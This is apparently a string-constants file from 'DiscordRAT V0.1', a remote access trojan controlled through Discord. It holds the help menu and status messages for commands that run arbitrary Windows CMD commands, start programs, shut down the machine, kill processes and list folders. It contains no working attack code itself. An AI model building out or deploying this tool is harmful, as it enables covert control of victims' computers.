COMMAND_DOES_NOT_EXISTS = 'that command does not exists "{command}"'
PROC_NOT_FOUND = 'Process not found'
HELP = '''
DiscordRAT V0.1 by crazyproger1

Available Commands:
$help - show this message
$exec cmd - execute cmd command (cmd - Windows CMD command)
$execo cmd - the same as above but also return output
$start app - start application (app - full path)
$shutdown [time] - shutdown (time - time before shutdown in secs)
$chmd mode - change working mode (modes: 0 - basic, 1 - filesystem)
$kill [pid] / [name] - kill process (pid - process id, name - process name)
$exit - close session

Examples:
$help 
$exec cmd = 'start explorer'
$chmd mode = 1
'''

FILESYSTEM_HELP = '''
DiscordRAT V0.1 by crazyproger1

Available Commands:
$rmde - reset mode to 0 (basic)
$dir / $ls [path] - display list of the folder content (path - path to folder)

Examples:
$rmde
$dir D:/
$ls C:/
'''
KILLED = 'Process killed'

EXECUTED = 'Command executed ({status})'
APPLICATION_STARTED = 'Application started'
MODE_CHANGED = 'Mode changed'
MODE_AUTO_CHANGE = 'Mode automatically changed to {value} ({name})'

ERR_COMMAND = 'COMMAND ERROR: '
ERR_ARG = 'ARGUMENT ERROR: '
ERR_UNIDENTIFIED = 'UNIDENTIFIED ERROR: '
ERR_OUTPUT = 'OUTPUT ERROR: '
ERR_COMMAND_EXECUTION = 'COMMAND EXECUTION ERROR: '
